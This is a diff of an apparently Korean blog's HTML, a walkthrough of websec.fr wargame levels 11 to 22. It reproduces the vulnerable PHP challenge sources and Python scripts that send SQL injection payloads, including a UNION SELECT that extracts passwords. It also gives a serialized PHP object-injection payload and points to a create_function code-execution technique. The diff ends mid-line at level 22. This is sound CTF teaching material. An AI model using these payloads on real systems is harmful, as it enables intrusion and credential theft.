-    r = requests.post(url, data=param)
-
-    print r.text
-
-def main():
-    submit()
-
-main()</code></pre>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">submit</span>():</span><br>    url = <span class="hljs-string">&#x27;https://websec.fr/level11/index.php&#x27;</span><br>    param = &#123;<span class="hljs-string">&#x27;user_id&#x27;</span>:<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;table&#x27;</span>:<span class="hljs-string">&#x27;(select 2 id,enemy username from costume)&#x27;</span>,<span class="hljs-string">&#x27;submit&#x27;</span>:<span class="hljs-string">&#x27;submit&#x27;</span>&#125;<br>    r = requests.post(url, data=param)<br><br>    <span class="hljs-built_in">print</span> r.text<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    submit()<br><br>main()<br></code></pre></td></tr></table></figure>
 <hr>
-<h3 id="5-LEVEL-13"><a href="#5-LEVEL-13" class="headerlink" title="5. LEVEL 13"></a>5. LEVEL 13</h3><pre><code class="php">&lt;?php
-
-// Defines $flag
-include &#39;flag.php&#39;;
-
-$db = new PDO(&#39;sqlite::memory:&#39;);
-$db-&gt;exec(&#39;CREATE TABLE users (
-  user_id   INTEGER PRIMARY KEY,
-  user_name TEXT NOT NULL,
-  user_privileges INTEGER NOT NULL,
-  user_password TEXT NOT NULL
-)&#39;);
-
-$db-&gt;prepare(&quot;INSERT INTO users VALUES(0, &#39;admin&#39;, 0, &#39;$flag&#39;);&quot;)-&gt;execute();
-
-for($i=1; $i&lt;25; $i++) &#123;
-  $pass = md5(uniqid());
-  $user = &quot;user_&quot; . substr(crc32($pass), 0, 2);
-  $db-&gt;prepare(&quot;INSERT INTO users VALUES($i, &#39;$user&#39;, 1, &#39;$pass&#39;);&quot;)-&gt;execute();
-&#125;
-?&gt;</code></pre>
-<pre><code class="php">&lt;?php
-if (isset($_GET[&#39;ids&#39;])) &#123;
-    if ( ! is_string($_GET[&#39;ids&#39;])) &#123;
-        die(&quot;Don&#39;t be silly.&quot;);
-    &#125;
-
-    if ( strlen($_GET[&#39;ids&#39;]) &gt; 70) &#123;
-        die(&quot;Please don&#39;t check all the privileges at once.&quot;);
-    &#125;
-
-  $tmp = explode(&#39;,&#39;,$_GET[&#39;ids&#39;]);
-  for ($i = 0; $i &lt; count($tmp); $i++ ) &#123;
-        $tmp[$i] = (int)$tmp[$i];
-        if( $tmp[$i] &lt; 1 ) &#123;
-            unset($tmp[$i]);
-        &#125;
-  &#125;
-
-  $selector = implode(&#39;,&#39;, array_unique($tmp));
-
-  $query = &quot;SELECT user_id, user_privileges, user_name
-  FROM users
-  WHERE (user_id in (&quot; . $selector . &quot;));&quot;;
-
-  $stmt = $db-&gt;query($query);
-
-    echo &#39;&lt;br&gt;&#39;;
-    echo &#39;&lt;div class=&quot;well&quot;&gt;&#39;;
-  echo &#39;&lt;ul&gt;&#39;;
-  while ($row = $stmt-&gt;fetch(\PDO::FETCH_ASSOC)) &#123;
-        echo &quot;&lt;li&gt;&quot;;
-        echo &quot;User &lt;em&gt;&quot; . $row[&#39;user_name&#39;] . &quot;&lt;/em&gt;&quot;;
-      echo &quot;    with id &lt;code&gt;&quot; . $row[&#39;user_id&#39;] . &#39;&lt;/code&gt;&#39;;
-        echo &quot; has &lt;b&gt;&quot; . ($row[&#39;user_privileges&#39;] == 0?&quot;all&quot;:&quot;no&quot;) . &quot;&lt;/b&gt; privileges.&quot;;
-        echo &quot;&lt;/li&gt;\n&quot;;
-  &#125;
-    echo &quot;&lt;/ul&gt;&quot;;
-    echo &quot;&lt;/div&gt;&quot;;
-&#125;
-?&gt;</code></pre>
+<h3 id="5-LEVEL-13"><a href="#5-LEVEL-13" class="headerlink" title="5. LEVEL 13"></a>5. LEVEL 13</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Defines $flag</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> PDO(<span class="hljs-string">&#x27;sqlite::memory:&#x27;</span>);<br><span class="hljs-variable">$db</span>-&gt;exec(<span class="hljs-string">&#x27;CREATE TABLE users (</span><br><span class="hljs-string">  user_id   INTEGER PRIMARY KEY,</span><br><span class="hljs-string">  user_name TEXT NOT NULL,</span><br><span class="hljs-string">  user_privileges INTEGER NOT NULL,</span><br><span class="hljs-string">  user_password TEXT NOT NULL</span><br><span class="hljs-string">)&#x27;</span>);<br><br><span class="hljs-variable">$db</span>-&gt;prepare(<span class="hljs-string">&quot;INSERT INTO users VALUES(0, &#x27;admin&#x27;, 0, &#x27;<span class="hljs-subst">$flag</span>&#x27;);&quot;</span>)-&gt;execute();<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">1</span>; <span class="hljs-variable">$i</span>&lt;<span class="hljs-number">25</span>; <span class="hljs-variable">$i</span>++) &#123;<br>  <span class="hljs-variable">$pass</span> = md5(uniqid());<br>  <span class="hljs-variable">$user</span> = <span class="hljs-string">&quot;user_&quot;</span> . substr(crc32(<span class="hljs-variable">$pass</span>), <span class="hljs-number">0</span>, <span class="hljs-number">2</span>);<br>  <span class="hljs-variable">$db</span>-&gt;prepare(<span class="hljs-string">&quot;INSERT INTO users VALUES(<span class="hljs-subst">$i</span>, &#x27;<span class="hljs-subst">$user</span>&#x27;, 1, &#x27;<span class="hljs-subst">$pass</span>&#x27;);&quot;</span>)-&gt;execute();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ids&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> ( ! is_string(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ids&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Don&#x27;t be silly.&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ( strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ids&#x27;</span>]) &gt; <span class="hljs-number">70</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Please don&#x27;t check all the privileges at once.&quot;</span>);<br>    &#125;<br><br>  <span class="hljs-variable">$tmp</span> = explode(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ids&#x27;</span>]);<br>  <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; count(<span class="hljs-variable">$tmp</span>); <span class="hljs-variable">$i</span>++ ) &#123;<br>        <span class="hljs-variable">$tmp</span>[<span class="hljs-variable">$i</span>] = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$tmp</span>[<span class="hljs-variable">$i</span>];<br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$tmp</span>[<span class="hljs-variable">$i</span>] &lt; <span class="hljs-number">1</span> ) &#123;<br>            <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$tmp</span>[<span class="hljs-variable">$i</span>]);<br>        &#125;<br>  &#125;<br><br>  <span class="hljs-variable">$selector</span> = implode(<span class="hljs-string">&#x27;,&#x27;</span>, array_unique(<span class="hljs-variable">$tmp</span>));<br><br>  <span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;SELECT user_id, user_privileges, user_name</span><br><span class="hljs-string">  FROM users</span><br><span class="hljs-string">  WHERE (user_id in (&quot;</span> . <span class="hljs-variable">$selector</span> . <span class="hljs-string">&quot;));&quot;</span>;<br><br>  <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$db</span>-&gt;query(<span class="hljs-variable">$query</span>);<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;well&quot;&gt;&#x27;</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;ul&gt;&#x27;</span>;<br>  <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-variable">$stmt</span>-&gt;fetch(\PDO::FETCH_ASSOC)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;li&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;User &lt;em&gt;&quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;user_name&#x27;</span>] . <span class="hljs-string">&quot;&lt;/em&gt;&quot;</span>;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;    with id &lt;code&gt;&quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>] . <span class="hljs-string">&#x27;&lt;/code&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot; has &lt;b&gt;&quot;</span> . (<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;user_privileges&#x27;</span>] == <span class="hljs-number">0</span>?<span class="hljs-string">&quot;all&quot;</span>:<span class="hljs-string">&quot;no&quot;</span>) . <span class="hljs-string">&quot;&lt;/b&gt; privileges.&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/li&gt;\n&quot;</span>;<br>  &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/ul&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/div&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 <p>문제의 코드이다. 핵심만 찾아서 한번 분석 해보자</p>
-<pre><code class="php">$tmp = explode(&#39;,&#39;,$_GET[&#39;ids&#39;]);
-for ($i = 0; $i &lt; count($tmp); $i++ ) &#123;
-      $tmp[$i] = (int)$tmp[$i];
-      if( $tmp[$i] &lt; 1 ) &#123;
-          unset($tmp[$i]);
-      &#125;
-&#125;</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$tmp</span> = explode(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ids&#x27;</span>]);<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; count(<span class="hljs-variable">$tmp</span>); <span class="hljs-variable">$i</span>++ ) &#123;<br>      <span class="hljs-variable">$tmp</span>[<span class="hljs-variable">$i</span>] = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$tmp</span>[<span class="hljs-variable">$i</span>];<br>      <span class="hljs-keyword">if</span>( <span class="hljs-variable">$tmp</span>[<span class="hljs-variable">$i</span>] &lt; <span class="hljs-number">1</span> ) &#123;<br>          <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$tmp</span>[<span class="hljs-variable">$i</span>]);<br>      &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 <p>이 부분을 보면 explode를 하고나서 for문을 돌리는데 여기서</p>
 <p>$tmp 부분을 고정으로 사용하지 않고 반복문이 돌때마다 다시 저장해주고 있다.</p>
 <p>$tmp[i] &lt; 1 부분에서 1보다 작은 값이 들어가게 된다면 unset를 수행하게 되는데</p>
 <p>이 떼 반복문에 도는 count 함수의 반환 값은 처음에 실행되었을 때의 값이랑 달라지게 된다.</p>
 <p>그 점을 보면 정수형이 아닌 문자들이 값으로 들어오기 때문에 이 취약점을 이용해 문제를 풀이할 수 있다.</p>
-<pre><code class="python">#!/usr/bin/python3
-
-import requests
-
-def submit(data):
-    url = &quot;http://websec.fr/level13/index.php&quot;
-    param = &#123;&#39;ids&#39;:data,&#39;submit&#39;:&#39;Go&#39;&#125;
-    r = requests.get(url, params=param)
-
-    print r.text
-
-data = &#39;0,0,0,0)) union select user_password,user_name,3 from users--&#39;
-submit(data)</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">submit</span>(<span class="hljs-params">data</span>):</span><br>    url = <span class="hljs-string">&quot;http://websec.fr/level13/index.php&quot;</span><br>    param = &#123;<span class="hljs-string">&#x27;ids&#x27;</span>:data,<span class="hljs-string">&#x27;submit&#x27;</span>:<span class="hljs-string">&#x27;Go&#x27;</span>&#125;<br>    r = requests.get(url, params=param)<br><br>    <span class="hljs-built_in">print</span> r.text<br><br>data = <span class="hljs-string">&#x27;0,0,0,0)) union select user_password,user_name,3 from users--&#x27;</span><br>submit(data)<br></code></pre></td></tr></table></figure>
 <hr>
-<h3 id="6-LEVEL-15"><a href="#6-LEVEL-15" class="headerlink" title="6. LEVEL 15"></a>6. LEVEL 15</h3><pre><code class="php">&lt;?php
-ini_set(&#39;display_errors&#39;, &#39;on&#39;);
-ini_set(&#39;error_reporting&#39;, E_ALL);
-
-$success = &#39;
-&lt;div class=&quot;alert alert-success alert-dismissible&quot; role=&quot;alert&quot;&gt;
-    &lt;button type=&quot;button&quot; class=&quot;close&quot; data-dismiss=&quot;alert&quot; aria-label=&quot;Close&quot;&gt;&lt;span aria-hidden=&quot;true&quot;&gt;&amp;times;&lt;/span&gt;&lt;/button&gt;
-    Function declared.
-&lt;/div&gt;
-&#39;;
-
-include &quot;flag.php&quot;;
-
-if (isset ($_POST[&#39;c&#39;]) &amp;&amp; !empty ($_POST[&#39;c&#39;])) &#123;
-    $fun = create_function(&#39;$flag&#39;, $_POST[&#39;c&#39;]);
-    print($success);
-    //fun($flag);
-    if (isset($_POST[&#39;q&#39;]) &amp;&amp; $_POST[&#39;q&#39;] == &#39;checked&#39;) &#123;
-        die();
-    &#125;
-&#125;
-?&gt;</code></pre>
+<h3 id="6-LEVEL-15"><a href="#6-LEVEL-15" class="headerlink" title="6. LEVEL 15"></a>6. LEVEL 15</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-string">&#x27;on&#x27;</span>);<br>ini_set(<span class="hljs-string">&#x27;error_reporting&#x27;</span>, E_ALL);<br><br><span class="hljs-variable">$success</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;div class=&quot;alert alert-success alert-dismissible&quot; role=&quot;alert&quot;&gt;</span><br><span class="hljs-string">    &lt;button type=&quot;button&quot; class=&quot;close&quot; data-dismiss=&quot;alert&quot; aria-label=&quot;Close&quot;&gt;&lt;span aria-hidden=&quot;true&quot;&gt;&amp;times;&lt;/span&gt;&lt;/button&gt;</span><br><span class="hljs-string">    Function declared.</span><br><span class="hljs-string">&lt;/div&gt;</span><br><span class="hljs-string">&#x27;</span>;<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$fun</span> = create_function(<span class="hljs-string">&#x27;$flag&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]);<br>    <span class="hljs-keyword">print</span>(<span class="hljs-variable">$success</span>);<br>    <span class="hljs-comment">//fun($flag);</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;q&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;q&#x27;</span>] == <span class="hljs-string">&#x27;checked&#x27;</span>) &#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 <p>c라는 변수에 우리가 임의로 값을 입력할 수 있다.</p>
 <p>입력한 값이 create_function 함수를 거쳐 $fun 변수에 저장되고,</p>
 <p>이후 $success 함수에 정의된 내용을 출력해준다.</p>
@@ -670,46 +458,7 @@ if (isset ($_POST[&#39;c&#39;]) &amp;&amp; !empty ($_POST[&#39;c&#39;])) &#123;
 <li>참고 : <a target="_blank" rel="noopener" href="https://blog.jhyeon.xyz/category/docx/function_rce/">https://blog.jhyeon.xyz/category/docx/function_rce/</a></li>
 </ul>
 <hr>
-<h3 id="8-LEVEL-20"><a href="#8-LEVEL-20" class="headerlink" title="8. LEVEL 20"></a>8. LEVEL 20</h3><pre><code class="php">&lt;?php
-
-include &quot;flag.php&quot;;
-
-class Flag &#123;
-    public function __destruct() &#123;
-       global $flag;
-       echo $flag; 
-    &#125;
-&#125;
-
-function sanitize($data) &#123;
-    /* i0n1c&#39;s bypass won&#39;t save you this time! (https://www.exploit-db.com/exploits/22547/) */
-    if ( ! preg_match (&#39;/[A-Z]:/&#39;, $data)) &#123;
-        return unserialize ($data);
-    &#125;
-
-    if ( ! preg_match (&#39;/(^|;|&#123;|&#125;)O:[0-9+]+:&quot;/&#39;, $data )) &#123;
-        return unserialize ($data);
-    &#125;
-
-    return false;
-&#125;
-
-$data = Array();
-if (isset ($_COOKIE[&#39;data&#39;])) &#123;
-    $data = sanitize (base64_decode ($_COOKIE[&#39;data&#39;]));
-&#125;
-
-if (isset ($_POST[&#39;value&#39;]) and ! empty ($_POST[&#39;value&#39;])) &#123;
-    /* Add a value twice to remove it from the list. */
-    if (($key = array_search ($_POST[&#39;value&#39;], $data)) !== false) &#123;
-        unset ($data[$key]);
-    &#125; else &#123; /* Else, simply add it. */
-        array_push ($data, $_POST[&#39;value&#39;]);
-    &#125;
-    setcookie (&#39;data&#39;, base64_encode (serialize ($data)));
-&#125;
-
-?&gt;</code></pre>
+<h3 id="8-LEVEL-20"><a href="#8-LEVEL-20" class="headerlink" title="8. LEVEL 20"></a>8. LEVEL 20</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>       <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>       <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>; <br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sanitize</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;<br>    <span class="hljs-comment">/* i0n1c&#x27;s bypass won&#x27;t save you this time! (https://www.exploit-db.com/exploits/22547/) */</span><br>    <span class="hljs-keyword">if</span> ( ! preg_match (<span class="hljs-string">&#x27;/[A-Z]:/&#x27;</span>, <span class="hljs-variable">$data</span>)) &#123;<br>        <span class="hljs-keyword">return</span> unserialize (<span class="hljs-variable">$data</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ( ! preg_match (<span class="hljs-string">&#x27;/(^|;|&#123;|&#125;)O:[0-9+]+:&quot;/&#x27;</span>, <span class="hljs-variable">$data</span> )) &#123;<br>        <span class="hljs-keyword">return</span> unserialize (<span class="hljs-variable">$data</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-variable">$data</span> = <span class="hljs-keyword">Array</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;data&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$data</span> = sanitize (base64_decode (<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;data&#x27;</span>]));<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;value&#x27;</span>]) <span class="hljs-keyword">and</span> ! <span class="hljs-keyword">empty</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;value&#x27;</span>])) &#123;<br>    <span class="hljs-comment">/* Add a value twice to remove it from the list. */</span><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$key</span> = array_search (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;value&#x27;</span>], <span class="hljs-variable">$data</span>)) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-keyword">unset</span> (<span class="hljs-variable">$data</span>[<span class="hljs-variable">$key</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">/* Else, simply add it. */</span><br>        array_push (<span class="hljs-variable">$data</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;value&#x27;</span>]);<br>    &#125;<br>    setcookie (<span class="hljs-string">&#x27;data&#x27;</span>, base64_encode (serialize (<span class="hljs-variable">$data</span>)));<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 <p>PHP Object Injection 문제가 다시 돌아왔다.</p>
 <p>소스코드를 분석해보면 일단 data 라는 쿠키에 serialize 된 값을 넣어주는 것으로 보아</p>
 <p>class Flag 객체를 serialize 해서 넣어주면 된다.</p>
@@ -725,54 +474,7 @@ if (isset ($_POST[&#39;value&#39;]) and ! empty ($_POST[&#39;value&#39;])) &#123
 <p>serialize : C:4:’Flag’:0:{}</p>
 <p>serialize(base64) -&gt; Qzo0OuKAmUZsYWfigJk6MDp7fQ==</p>
 <hr>
-<h3 id="9-LEVEL-22"><a href="#9-LEVEL-22" class="headerlink" title="9. LEVEL 22"></a>9. LEVEL 22</h3><pre><code class="php">&lt;?php
-class A &#123;
-    public $pub;
-    protected $pro ;
-    private $pri;
-
-    function __construct($pub, $pro, $pri) &#123;
-        $this-&gt;pub = $pub;
-        $this-&gt;pro = $pro;
-        $this-&gt;pri = $pri;
-    &#125;
-&#125;
-
-include &#39;file_containing_the_flag_parts.php&#39;;
-$a = new A($f1, $f2, $f3);
-
-unset($f1);
-unset($f2);
-unset($f3);
-
-$funcs_internal = get_defined_functions()[&#39;internal&#39;];
-
-/* lets allow some secure funcs here */
-unset ($funcs_internal[array_search(&#39;strlen&#39;, $funcs_internal)]);
-unset ($funcs_internal[array_search(&#39;print&#39;, $funcs_internal)]);
-unset ($funcs_internal[array_search(&#39;strcmp&#39;, $funcs_internal)]);
-unset ($funcs_internal[array_search(&#39;strncmp&#39;, $funcs_internal)]);
-
-$funcs_extra = array (&#39;eval&#39;, &#39;include&#39;, &#39;require&#39;, &#39;function&#39;);
-$funny_chars = array (&#39;\.&#39;, &#39;\+&#39;, &#39;-&#39;, &#39;&quot;&#39;, &#39;;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;);
-$variables = array (&#39;_GET&#39;, &#39;_POST&#39;, &#39;_COOKIE&#39;, &#39;_REQUEST&#39;, &#39;_SERVER&#39;, &#39;_FILES&#39;, &#39;_ENV&#39;, &#39;HTTP_ENV_VARS&#39;, &#39;_SESSION&#39;, &#39;GLOBALS&#39;);
-
-$blacklist = array_merge($funcs_internal, $funcs_extra, $funny_chars, $variables);
-
-$insecure = false;
-foreach ($blacklist as $blacklisted) &#123;
-    if (preg_match (&#39;/&#39; . $blacklisted . &#39;/im&#39;, $code)) &#123;
-        $insecure = true;
-        break;
-    &#125;
-&#125;
-
-if ($insecure) &#123;
-    echo &#39;Insecure code detected!&#39;;
-&#125; else &#123;
-    eval (&quot;echo $code;&quot;);
-&#125;
-?&gt;</code></pre>
+<h3 id="9-LEVEL-22"><a href="#9-LEVEL-22" class="headerlink" title="9. LEVEL 22"></a>9. LEVEL 22</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pub</span>;<br>    <span class="hljs-keyword">protected</span> <span 